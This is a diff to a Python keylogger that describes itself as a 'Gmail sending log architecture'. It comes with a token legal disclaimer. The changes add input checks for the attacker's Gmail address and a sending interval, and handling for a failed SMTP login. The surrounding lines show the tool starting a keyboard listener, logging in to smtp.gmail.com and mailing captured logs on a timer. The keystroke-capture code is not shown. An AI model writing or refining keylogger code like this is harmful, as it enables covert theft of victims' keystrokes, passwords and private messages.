@@ -4,6 +4,7 @@ from datetime import datetime
 from getpass import getpass
 
 import smtplib
+
 info = "Keylogger Python based with Gmail sending log architecture"
 
 disclaimer = """Do not attempt to violate the law. 
@@ -14,11 +15,19 @@ print("\n" + info + "\n\n" + disclaimer + "\n")
 
 EMAIL_ADDRESS = input("Email Address: ")
 while "@gmail.com" not in EMAIL_ADDRESS:
-    print("Wrong Mail Format, try again...\n")
+    print("Wrong Mail Format...\n")
     EMAIL_ADDRESS = input("Email Address: ")
 
-EMAIL_PASSWD = getpass("Email password: ")
-TIME = float(input("Average sending mail time: "))
+EMAIL_PASSWD = getpass("\nEmail password: ")
+
+flag = False
+while flag is False:
+    try:
+        TIME = float(input("\nAverage sending mail time: "))
+        flag = True
+    except ValueError:
+        print("Wrong format value...")
+        flag = False
 
 now = datetime.now()
 
@@ -55,6 +64,8 @@ listener.start()
  
 server=smtplib.SMTP('smtp.gmail.com',587)
 server.starttls()
-server.login(EMAIL_ADDRESS, EMAIL_PASSWD)
+
+try: server.login(EMAIL_ADDRESS, EMAIL_PASSWD)
+except smtplib.SMTPAuthenticationError: print("\nConnection REFUSED (Check credentials or the references)\n"), exit()
  
 Timer(0.0, send).start()
